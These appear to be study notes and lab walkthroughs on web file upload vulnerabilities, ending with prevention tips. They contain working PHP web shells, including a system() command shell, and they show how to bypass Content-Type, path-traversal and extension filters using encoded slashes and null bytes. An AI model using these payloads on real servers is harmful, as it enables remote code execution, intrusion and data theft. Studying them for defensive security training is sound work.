
- File upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size.

- Failing to properly enforce restrictions on these could mean being able to upload dangerous and malicious files (also server-side script files that enable *remote code execution*) 

## Exploiting unrestricted file uploads to deploy a web shell

The worst possible scenario is when a website allows you to upload server-side scripts, such as PHP, Java, or Python files, and is also configured to execute them as code. This will make you create your own web shell on the server.

A **web shell** is a malicious script that enables an attacker to execute arbitrary commands on a remote web server simply by sending HTTP requests to the right endpoint.

If you're able to successfully upload a web shell, you effectively have full control over the server. This means you can read and write arbitrary files, exfiltrate sensitive data, even use the server to pivot attacks against both internal infrastructure and other servers outside the network. For example, the following PHP one-liner could be used to read arbitrary files from the server's filesystem:

`<?php echo file_get_contents('/path/to/target/file'); ?>`

Once uploaded, sending a request for this malicious file will return the target file's contents in the response.

A more versatile web shell may look something like this:

`<?php echo system($_GET['command']); ?>`

This script enables you to pass an arbitrary system command via a query parameter as follows:

`GET /example/exploit.php?command=id HTTP/1.1`

###### Lab: Remote code execution via web shell upload

This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

- Upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`.  To do this, upload a `.php` file with the following content:

`<?php echo file_get_contents('/home/carlos/secret'); ?>`

- Then, open the image in a new tab. You should see the secret.

## Exploiting flawed validation of file uploads

In the wild, it's unlikely that you'll find a website that has no protection against file upload attacks. But you can sometimes still exploit flaws in these mechanisms to obtain a web shell for remote code execution.

### Flawed file type validation

When submitting HTML forms, the browser typically sends the provided data in a `POST` request with the content type `application/x-www-form-url-encoded`. This is fine for sending simple text like your name or address. However, it isn't suitable for sending large amounts of binary data, such as an entire image file or a PDF document. In this case, the content type `multipart/form-data` is preferred.

Consider a form containing fields for uploading an image:

```http
POST /images HTTP/1.1 
Host: normal-website.com 
Content-Length: 12345 
Content-Type: multipart/form-data; 
boundary=---------------------------012345678901234567890123456 -----------------

----------012345678901234567890123456 

Content-Disposition: form-data; name="image"; filename="example.jpg" 
Content-Type: image/jpeg 

[...binary content of example.jpg...]

---------------------------012345678901234567890123456 
Content-Disposition: form-data; name="description" 

This is an interesting description of my image. 

---------------------------012345678901234567890123456 
Content-Disposition: form-data; name="username" 

wiener 

---------------------------012345678901234567890123456--
```

The message body is split into separate parts for each of the form's inputs. Each part contains a `Content-Disposition` header, which provides some basic information about the input field it relates to. These individual parts may also contain their own `Content-Type` header, which tells the server the MIME type of the data that was submitted using this input.

One way that websites may attempt to validate file uploads is to check that this input-specific `Content-Type` header matches an expected MIME type. If the server is only expecting image files, for example, it may only allow types like `image/jpeg` and `image/png`. Problems can arise when the value of this header is implicitly trusted by the server. If no further validation is performed to check whether the contents of the file actually match the supposed MIME type, this defense can be easily bypassed.

###### Lab: Web shell upload via Content-Type restriction bypass

This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.

- Upload a malicious `.php` file and notice the `403 Forbidden` response with the following message:

*Sorry, file type application/x-php is not allowed. Only image/jpeg and image/png are allowed*

- Intercept the upload request and modify the `Content-type` header in the body from `application/x-php` to `image/png` and send again the request. Now the file should have been uploaded correctly.

### Preventing file execution in user-accessible directories

As a precaution, servers generally only run scripts whose MIME type they have been explicitly configured to execute. Otherwise, they may just return some kind of error message or, in some cases, serve the contents of the file as plain text instead:

This behavior may provide a way to leak source code, but it nullifies any attempt to create a web shell.

This kind of configuration often differs between directories. If you can find a way to upload a script to a different directory that's not supposed to contain user-supplied files, the server may execute your script after all.

###### Lab: Web shell upload via path traversal

- Upload a malicious `.php` file and notice the response with the following message:

*The file avatars/file_upload_vuln.php has been uploaded*

- Intercept the upload request and try to do a **path traversal attack** by modifying the filename header in the body:

```http
Content-Disposition: form-data; name="avatar"; filename="../file_upload_vuln.php"
```

- Notice that the response says again `The file avatars/exploit.php has been uploaded.` This suggests that the server is stripping the directory traversal sequence from the file name.

- Obfuscate the directory traversal sequence by URL encoding the forward slash (`/`) character, resulting in:

```http
filename="..%2ffile_upload_vuln.php"
```

- Now open the uploaded image in the browser and check the secret.

### Insufficient blacklisting of dangerous file types

One of the more obvious ways of preventing users from uploading malicious scripts is to blacklist potentially dangerous file extensions like `.php`. The practice of blacklisting is inherently flawed as it's difficult to explicitly block every possible file extension that could be used to execute code. Such blacklists can sometimes be bypassed by using lesser known, alternative file extensions that may still be executable, such as `.php5`, `.shtml`, and so on.

#### Obfuscating file extensions

Even the most exhaustive blacklists can potentially be bypassed using classic obfuscation techniques. Let's say the validation code is case sensitive and fails to recognize that `exploit.pHp` is in fact a `.php` file.

You can also achieve similar results using the following techniques:

- **Provide multiple extensions**: the following file may be interpreted as either a PHP file or JPG image: `exploit.php.jpg`
- **Add trailing characters**: some components will strip or ignore trailing whitespaces, dots, and suchlike: `exploit.php.`
- **Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes**: if the value isn't decoded when validating the file extension, but is later decoded server-side, this can also allow you to upload malicious files that would otherwise be blocked: `exploit%2Ephp`
- **Add semicolons or URL-encoded null byte characters before the file extension**: if validation is written in a high-level language like PHP or Java, but the server processes the file using lower-level functions in C/C++, for example, this can cause discrepancies in what is treated as the end of the filename: `exploit.asp;.jpg` or `exploit.asp%00.jpg`
- **Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization**: sequences like `xC0 x2E`, `xC4 xAE` or `xC0 xAE` may be translated to `x2E` if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.

Other defenses involve stripping or replacing dangerous extensions to prevent the file from being executed. If this transformation isn't applied recursively, you can position the prohibited string in such a way that removing it still leaves behind a valid file extension. For example, consider what happens if you strip `.php` from the following filename:

`exploit.p.phphp`

###### Lab: Web shell upload via obfuscated file extension

Upload a malicious `.php` file and notice the `403 Forbidden` response with the following message:

*Sorry, only JPG & PNG files are allowed Sorry, there was an error uploading your file.*

- Intercept the upload request and try to obfuscate the file extension by modifying the filename header in the body:

```http
Content-Disposition: form-data; name="avatar"; filename="file_upload_vuln.php.jpg"
```

- The file has been correctly uploaded by providing multiple file extensions. But now we can't execute the malicious code, since the file is seen as an image by the server!

- Try again uploading the file with another obfuscation technique:

```http
Content-Disposition: form-data; name="avatar"; filename="file_upload_vuln.php%00.jpg"
```

- By adding a *NULL byte* between the two file extensions, the file will be correctly upload and seen as a `.php` (because all the characters after the NULL byte will be truncated). Hence, the file will be executed!

- Now open the uploaded image in the browser and check the secret.


## Prevention

- Use allow lists for file extensions. Avoid disallow lists!
- Validate filename against path traversal (use filesystem APIs)
- Rename uploaded files to avoid collisions (use UUIDs)
- Store the file in a temporary filesystem until fully validated
- Use an established framework for preprocessing file uploads
